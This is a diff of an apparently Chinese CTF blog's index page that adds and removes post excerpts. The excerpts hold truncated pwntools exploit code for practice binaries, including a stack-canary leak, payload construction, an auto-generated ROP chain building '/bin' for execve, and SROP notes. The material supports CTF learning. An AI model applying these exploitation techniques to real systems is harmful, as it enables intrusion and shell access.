@@ -134,6 +134,104 @@
     
     
     <div class="col-12 col-md-8 m-auto">
+      <a href="/2020/02/05/oneshot_tjctf_2016/">
+        <p class="h4 index-header">oneshot_tjctf_2016</p>
+        
+        
+          
+        
+        <div class="index-excerpt" >
+          <div class="index-text mb-1">oneshot_tjctf_2016
+
+*v4，要用str(elf.got[&#39;__libc_start_main&#39;])
+接受要用int(sh.recvuntil(&quot;\n&quot;,True),16)
+exp
+# -*- coding: utf-8 -*-
+from pwn import *
+context.log_level = &#39;debug&#39;
+context.arch = &#39;amd64&#39;
+elf = ELF(&#39;./oneshot_tjctf_2016&#39;)
+lib = 0
+sh = 0
+def pwn(ip,port,debug):
+    global lib
+    global sh
+    if debug == 1:
+        sh = process(&#39;./oneshot_tjctf_2016&#39;)
+        lib = ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)
+    else:
+        sh = remote(</div>
+        </div>
+      </a>
+
+      <div>
+        
+          <i class="iconfont icon-riqi2"></i>&nbsp;2020-02-05&nbsp;&nbsp;
+        
+        
+          <i class="iconfont icon-inbox"></i>
+          
+            <a href="/categories/CTF">CTF</a>&nbsp;
+          
+            <a href="/categories/buu">buu</a>&nbsp;
+          &nbsp;
+        
+        
+      </div>
+    </div>
+  </div>
+
+  <div class="row mb-4 mx-auto">
+    
+    
+    <div class="col-12 col-md-8 m-auto">
+      <a href="/2020/02/04/leak_canary-others_babystack/">
+        <p class="h4 index-header">leak_canary-others_babystack</p>
+        
+        
+          
+        
+        <div class="index-excerpt" >
+          <div class="index-text mb-1">leak_canary-others_babystack
+Full RELRO GOT表只读
+
+s申请的是0x80，但读入0x100。并且canary在stack -0x8的地方
+先泄露canary，puts函数在输出时，只有遇到\x00才会结束，用\n覆盖canary的第一字节\x00，从而获得canary
+payload = cyclic(0x90-0x8)
+
+sh.recvuntil(&quot;iaab\n&quot;)
+canary =  u64(sh.recv(7).rjust(8,&quot;\x00&quot;))
+log.success(&quot;canary------&gt;&quot; + hex(canary))
+然后构造payload
+    def printf():
+        sh.sendlineafter(&quot;&gt;&gt;&quot;,&quot;2&quot;)
+    def quit():
+        sh.sendlineafter(&quot;&gt;&gt;&quot;,&quot;3&quot;)
+    pay</div>
+        </div>
+      </a>
+
+      <div>
+        
+          <i class="iconfont icon-riqi2"></i>&nbsp;2020-02-04&nbsp;&nbsp;
+        
+        
+          <i class="iconfont icon-inbox"></i>
+          
+            <a href="/categories/CTF">CTF</a>&nbsp;
+          
+            <a href="/categories/buu">buu</a>&nbsp;
+          &nbsp;
+        
+        
+      </div>
+    </div>
+  </div>
+
+  <div class="row mb-4 mx-auto">
+    
+    
+    <div class="col-12 col-md-8 m-auto">
       <a href="/2020/02/01/%E5%A0%86%E4%B9%8BUAF(Use_after_free)%E5%8F%8A%E8%B0%83%E8%AF%95-hitcontraining_uaf/">
         <p class="h4 index-header">堆之UAF(Use_after_free)及调试-hitcontraining_uaf</p>
         
@@ -500,9 +598,9 @@ from pwn </div>
           
             <a href="/categories/CTF">CTF</a>&nbsp;
           
-            <a href="/categories/buu">buu</a>&nbsp;
-          
             <a href="/categories/%E5%A4%87%E5%BF%98">备忘</a>&nbsp;
+          
+            <a href="/categories/buu">buu</a>&nbsp;
           &nbsp;
         
         
@@ -562,100 +660,11 @@ elf = ELF(&#39;./ROP_LEVE</div>
     </div>
   </div>
 
-  <div class="row mb-4 mx-auto">
-    
-    
-    <div class="col-12 col-md-8 m-auto">
-      <a href="/2020/01/14/SROP-ciscn_2019_s_3/">
-        <p class="h4 index-header">SROP-ciscn_2019_s_3</p>
-        
-        
-          
-        
-        <div class="index-excerpt" >
-          <div class="index-text mb-1">SROP-ciscn_2019_s_3/es_7Sigreturn Oriented Programming (SROP) Attack攻击原理
-比较详细的WP
-https://www.jianshu.com/p/ca4a5dacd1a2
-
-两个系统调用，一个是sys_read，一个是sys_write，往栈上写数据（0x400），从栈上读数据（0x30），存在栈溢出。还有一个gadget函数。
-
-有两个值得注意的地方。mov rax,0fh 以及mov rax 59。这两个gadget控制了rax的值，看看这两个是什么系统调用。15 sys_rt_sigreturn59 sys_execve
-解法一59号系统调用是execve那么就可以想办法控制寄存器的值调用execve(“/bin/sh”,0,0)，注意在调用execve时，后面两个参数需要置0，由于需要控制rdx的值，所以选择使用通用gadget，__libc_csu_init。
-r13的值会给到rdx，让rbx=0，下面call的时候会变为call [r12]，会去call r12指向位置的代码，我们可以调到后面的rop执行，</div>
-        </div>
-      </a>
-
-      <div>
-        
-          <i class="iconfont icon-riqi2"></i>&nbsp;2020-01-14&nbsp;&nbsp;
-        
-        
-          <i class="iconfont icon-inbox"></i>
-          
-            <a href="/categories/CTF">CTF</a>&nbsp;
-          
-            <a href="/categories/buu">buu</a>&nbsp;
-          
-            <a href="/categories/%E5%A4%87%E5%BF%98">备忘</a>&nbsp;
-          &nbsp;
-        
-        
-      </div>
-    </div>
-  </div>
-
-  <div class="row mb-4 mx-auto">
-    
-    
-    <div class="col-12 col-md-8 m-auto">
-      <a href="/2020/01/13/ROPgadget-not_the_same_3dsctf_2016/">
-        <p class="h4 index-header">ROPgadget-not_the_same_3dsctf_2016</p>
-        
-        
-          
-        
-        <div class="index-excerpt" >
-          <div class="index-text mb-1">ROPgadget-not_the_same_3dsctf_2016
-
-ROPgadget --binary not_the_same_3dsctf_2016 --ropchain
-自动生成
-from struct import pack
-p = &#39;&#39;
-p += pack(&#39;&lt;I&#39;, 0x0806fcca) # pop edx ; ret
-p += pack(&#39;&lt;I&#39;, 0x080eb060) # @ .data
-p += pack(&#39;&lt;I&#39;, 0x08048b0b) # pop eax ; ret
-p += &#39;/bin&#39;
-p += pack(&#39;&lt;I&#39;, 0x0805586b) # mov dword ptr [edx], eax ; ret
-p += pack(&#39;&lt;I&#39;, 0x0806fcca) # pop edx ; ret
-p += pack(&#39;&lt;I&#39;, 0x080eb064) # @ .data + 4
-p += p</div>
-        </div>
-      </a>
-
-      <div>
-        
-          <i class="iconfont icon-riqi2"></i>&nbsp;2020-01-13&nbsp;&nbsp;
-        
-        
-          <i class="iconfont icon-inbox"></i>
-          
-            <a href="/categories/CTF">CTF</a>&nbsp;
-          
-            <a href="/categories/buu">buu</a>&nbsp;
-          
-            <a href="/categories/%E5%A4%87%E5%BF%98">备忘</a>&nbsp;
-          &nbsp;
-        
-        
-      </div>
-    </div>
-  </div>
-
 
 
   <nav aria-label="index posts navigation">
     <span class="pagination pg-blue justify-content-center mt-5" id="pagination">
-      <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/2/"><i class="fas fa-angle-double-right"></i></a>
+      <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" href="/page/2/"><i class="fas fa-angle-double-right"></i></a>
     </span>
   </nav>
   
